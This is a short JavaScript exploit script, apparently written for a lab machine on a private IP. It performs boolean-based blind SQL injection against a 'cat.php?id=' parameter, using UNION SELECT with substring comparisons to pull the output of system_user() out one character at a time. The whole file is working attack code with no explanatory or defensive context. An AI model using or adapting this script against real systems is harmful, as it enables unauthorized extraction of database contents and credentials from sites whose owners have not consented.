URL = 'http://192.168.92.137/cat.php?id=999';
charset = "0123456789" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "abcdefghijklmnopqrstuvwxyz" + ".;:-_@";
query = 'system_user()';
truestring = "Picture: 1";
maxlength = 30;
result = "";

console.log(`Extracting results from query ${query}...`)

xhr = new XMLHttpRequest();

for (j=0;j<maxlength;j++) {
	
	nthchar = j;
	innerloop:
	for (i=0;i<charset.length;i++) {
	
	SQL_cmd = `${URL}%20UNION%20SELECT%20null,BINARY substring(${query},${nthchar},1)=%27${charset[i]}%27,null,null;--%20-`;
	xhr.open('GET',SQL_cmd,false);
	xhr.onload = function () {
		if (this.responseText.includes(`${truestring}`)) {
			console.log(`Character number ${nthchar} found: ${charset[i]}`);
			result += charset[i];
			}
	};
	xhr.send();
	}
}
console.log(`Results: ${result}`);